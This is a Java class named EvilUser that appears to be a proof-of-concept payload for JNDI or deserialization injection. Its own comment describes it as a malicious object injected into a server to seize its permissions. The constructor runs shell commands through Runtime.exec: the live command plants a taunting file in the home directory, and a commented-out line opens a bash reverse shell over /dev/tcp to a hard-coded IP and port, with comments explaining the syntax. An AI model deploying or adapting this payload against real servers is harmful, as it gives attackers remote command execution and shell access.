package com.cui.code.test.model;

import lombok.Data;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.io.Serializable;
import java.util.Hashtable;

/**
 * 恶意构造的侵入对象的class，通过注入到服务器获取服务器的权限
 *
 * @author cuiswing
 * @date 2019-07-16
 */
@Data
public class EvilUser implements Serializable, ObjectFactory {

    private String name;
    private int age;

    public EvilUser() {
        init();
    }

    public void init() {
        try {
            System.out.println("启动chrome：");
            // 执行命令：友好启动Chrome，您可以想象一个黑客会执行什么命令,shell反弹
            Runtime runtime = Runtime.getRuntime();
            // runtime.exec(new String[]{"/bin/bash", "-c", "/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome"});

            // 指定命令反弹shell
            // bash 中0是STDIN_FILENO（标准输入，一般是键盘），1是STDOUT_FILENO（标准输出，一般是终端控制台）
            // bash –i打开一个交互的bash,   /dev/tcp建立一个socket连接 ,  >& 将标准错误输出重定向到标准输出中，0>&1将标准输入重定向到标准输出中。
            Process p = runtime.exec(new String[]{"/bin/bash", "-c", "cd ~ && mkdir test && cd test && touch 你的电脑被我控制啦"});
            // Process p = runtime.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/172.23.43.159/8411 0>&1"});
            p.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
